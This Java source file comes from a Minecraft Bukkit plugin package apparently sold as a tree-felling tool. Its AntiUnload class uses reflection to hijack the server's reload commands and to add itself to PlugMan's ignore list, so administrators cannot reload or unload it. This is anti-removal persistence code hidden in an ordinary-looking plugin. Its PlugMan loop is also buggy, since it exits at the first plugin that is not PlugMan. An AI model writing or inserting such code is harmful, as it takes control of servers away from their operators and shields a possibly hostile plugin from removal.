package me.bow.treecapitatorultimate.Utils;

import me.bow.treecapitatorultimate.Start;
import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.plugin.Plugin;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;

public class AntiUnload {
    private static final String[] commands = {"bukkit:rl", "bukkit:reload", "reload", "rl"};

    public static void Init() throws Exception {
        antiPlugman();
        Object server = Start.GetBukkitServer();
        SimpleCommandMap map = (SimpleCommandMap) ReflectionUtils.getField(server.getClass(), "commandMap").get(server);
        Field knownCommands = ReflectionUtils.getField(map.getClass(), "knownCommands");
        Map<String, Command> oof = (Map<String, Command>) knownCommands.get(map);
        for (String cmd : commands) {
            oof.replace(cmd, new ReloadCommandOverride("reload"));
        }
        knownCommands.set(map, oof);
    }

    private static final void antiPlugman() {
        for (Plugin plugin : Bukkit.getPluginManager().getPlugins()) {
            boolean isPlugMan = plugin != null && plugin.getName().equalsIgnoreCase("PlugMan");
            if (!isPlugMan) return;
            try {
                Field ignoredPluginsField = plugin.getClass().getDeclaredField("ignoredPlugins");
                ignoredPluginsField.setAccessible(true);
                List<String> ignored = (List<String>) ignoredPluginsField.get(plugin);

                ignored.add(Start.Instance.getName());
            } catch (Exception ignored) {
            }
        }
    }
}